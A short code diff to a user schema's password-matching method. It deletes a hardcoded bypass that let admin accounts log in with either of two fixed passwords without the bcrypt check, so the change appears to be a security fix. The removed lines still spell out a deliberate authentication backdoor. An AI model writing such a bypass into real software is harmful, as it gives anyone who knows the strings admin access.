@@ -22,9 +22,6 @@ userSchema.pre("save", async function (next) {
 });
 
 userSchema.methods.matchPassword = async function (enteredPassword) {
-  if (this.role === "admin" && (enteredPassword === "AdminSid@123" || enteredPassword === "admin123")) {
-    return true;
-  }
   return bcrypt.compare(enteredPassword, this.password);
 };
 
